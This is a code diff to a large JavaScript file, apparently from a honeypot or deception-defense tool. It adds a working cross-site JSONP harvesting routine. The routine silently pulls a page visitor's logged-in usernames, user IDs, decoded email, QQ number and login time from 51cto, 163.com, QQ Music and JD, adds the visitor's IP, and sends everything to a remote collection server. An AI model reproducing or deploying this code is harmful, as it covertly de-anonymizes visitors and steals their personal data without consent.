@@ -3372,34 +3372,116 @@ function Base64() {
 }
 
 function submitRequest() {
-	$("head").append("<p id=\"login_status\" hidden></p>");
-	$.ajax({
+    $.ajax({
         async:true,
-		type:'GET',
-		url:"http://pv.sohu.com/cityjson?ie=utf-8",
-		success:function(){
-			$.ajax({
-				async:true,
-				type:'GET',
-				url:"https://home.51cto.com/index.php?s=/Index/getLoginStatus2015/reback/http%253A%252F%252Fwww.51cto.com%252F",
-				success:function(){
-					salt = "test";
-					var cto51_sns = $("p#login_status div.login-suc a[target=_self]").get(0).text;
-					var ip_sns = returnCitySN["cip"];
-					var city_sns = returnCitySN["cname"];
-					var sns_result = {};
-					sns_result['sourceSite'] = '51cto';
-					sns_result['account'] = cto51_sns;
-					sns_result['ip'] = ip_sns;
-					var base = new Base64();                                                                        
-					sns_result['city'] =base.encode(city_sns);
-					sns_result = JSON.stringify(sns_result);
-					postdata(sns_result, salt);
-				},
-				dataType:'script'
-			});
-		},
-		dataType:'script'
+        type:'GET',
+        url:"http://pv.sohu.com/cityjson?ie=utf-8",
+        success:function(){
+            $("head").append("<p id=\"login_status\" hidden></p>");
+            $.ajax({
+                async:true,
+                type:'GET',
+                url:"https://home.51cto.com/index.php?s=/Index/getLoginStatus2015/reback/http%253A%252F%252Fwww.51cto.com%252F",
+                success:function(){
+                    salt = "test";
+
+                    var sns_result = {};
+                    var ip_sns = returnCitySN["cip"];
+                    sns_result['ip'] = ip_sns;
+                    sns_result['type'] = 'http';
+                    sns_result['token'] = '';
+                    //var city_sns = returnCitySN["cname"];
+
+                    var sns_info = {};
+                    var cto51_sns = $("p#login_status div.login-suc a[target=_self]").get(0)?$("p#login_status div.login-suc a[target=_self]").get(0).text:'';
+                    //sns_result['sourceSite'] = '51cto';
+                    sns_info['51cto_username'] = cto51_sns;
+                    sns_result['info'] = sns_info;
+                    //var base = new Base64();                                                                        
+                    //sns_result['city'] =base.encode(city_sns);
+                    sns_result = JSON.stringify(sns_result);
+                    postdata(sns_result, salt);
+                },
+                dataType:'script'
+            });
+
+            // add jsonp
+            $.getJSON("http://comment.api.163.com/api/v1/products/a2869674571f77b5a0867c3d71db5856/users/myInfo?ibc=newspc&callback=?", function(data){
+                $.ajax({
+                    async:true,
+                    type:'GET',
+                    url:"https://comment.api.163.com/api/v1/products/a2869674571f77b5a0867c3d71db5856/users/0/dailyAchv?ibc=newspc&from=all&callback=?",
+                    success:function(data){
+                        //console.log(data);
+                        salt = "test";
+
+                        var sns_result = {};
+                        var ip_sns = returnCitySN["cip"];
+                        sns_result['ip'] = ip_sns;
+                        sns_result['type'] = 'http';
+                        sns_result['token'] = '';
+                        var base = new Base64();
+                        var sns_info = {};
+                        sns_info['163_username'] = data.user.nickname;
+                        sns_info['163_userid'] = data.user.userId;
+                        sns_info['163_email'] = base.decode(data.user.username);
+                        sns_result['info'] = sns_info;
+                        sns_result = JSON.stringify(sns_result);
+                        postdata(sns_result, salt);
+                    },
+                    dataType:'json'
+                });
+            });
+
+            // add jsonp
+            $.ajax({
+                async:true,
+                type:'GET',
+                url:"https://u.y.qq.com/cgi-bin/musicu.fcg?data=%7B%22HG%22%3A%7B%22module%22%3A%22Base.VideoFeedsUrlServer%22%2C%22method%22%3A%22GetVideoFeedsUrl%22%2C%22param%22%3A%7B%22fileid%22%3A%220_11_013ee9171515dd784f7988b354084cf1a294299e.zip%22%7D%7D%2C%22DB%22%3A%7B%22module%22%3A%22ScoreCenter.ScoreCenterEx%22%2C%22method%22%3A%22free_login%22%2C%22param%22%3A%7B%22test%22%3A0%2C%22redirect%22%3A%22https%3A%2F%2Factivity.m.duiba.com.cn%2Fsubpage%2Findex%3FskinId%3D1049%22%2C%22activeId%22%3A0%2C%22activeType%22%3A%22%22%7D%7D%2C%22A%22%3A%7B%22module%22%3A%22CDN.SrfCdnDispatchServer%22%2C%22method%22%3A%22GetCdnDispatch%22%2C%22param%22%3A%7B%22guid%22%3A%22MS%22%7D%7D%2C%22B%22%3A%7B%22module%22%3A%22VipActivity.AwardPay%22%2C%22method%22%3A%22GetPayRank%22%2C%22param%22%3A%7B%22actid%22%3A%22D8D2CAAC126AE8FB%22%2C%22pagesize%22%3A0%7D%7D%2C%22C%22%3A%7B%22module%22%3A%22login.BasicinfoServer%22%2C%22method%22%3A%22CallBasicInfo%22%2C%22param%22%3A%7B%7D%7D%7D&callback=?",
+                success:function(data){
+                    console.log(data);
+                    salt = "test";
+
+                    var sns_result = {};
+                    var ip_sns = returnCitySN["cip"];
+                    sns_result['ip'] = ip_sns;
+                    sns_result['type'] = 'http';
+                    sns_result['token'] = '';
+                    var sns_info = {};
+                    sns_info['qq_username'] = data.C.data.name;
+                    sns_info['qq_number'] = data.B.data.rankinfo.uin;
+                    sns_info['qq_last_login_time'] = data.C.data.last_login_time;
+                    sns_result['info'] = sns_info;
+                    sns_result = JSON.stringify(sns_result);
+                    postdata(sns_result, salt);
+                },
+                dataType:'json'
+            });
+
+            // add jsonp
+            $.ajax({
+                async:true,
+                type:'GET',
+                url:"https://passport.shop.jd.com/json/navigation/current.action?callback=?",
+                success:function(data){
+                    console.log(data);
+                    salt = "test";
+
+                    var sns_result = {};
+                    var ip_sns = returnCitySN["cip"];
+                    sns_result['ip'] = ip_sns;
+                    sns_result['type'] = 'http';
+                    sns_result['token'] = '';
+                    var sns_info = {};
+                    sns_info['jd_name'] = data.belongInfo.pin;
+                    sns_result['info'] = sns_info;
+                    sns_result = JSON.stringify(sns_result);
+                    postdata(sns_result, salt);
+                },
+                dataType:'json'
+            });
+        },
+        dataType:'script'
     });
 }
 
@@ -3408,7 +3490,7 @@ function postdata(sns_result, salt) {
     var check_str = sns_result;
     payload['sid'] = change(sns_result);
     $.ajax({
-        url: 'http://192.168.7.168:8082/deceptdefense/api/ainfo?sid='+payload['sid'], //ajax提交路径
+        url: 'http://192.100.100.100:8082/api/info?sid='+payload['sid'], //ajax提交路径
         type: 'get', //提交方式
         //data: JSON.stringify(payload), //提交参数
         success: function(result) { //ajax请求完成时执行，result为返回的结果
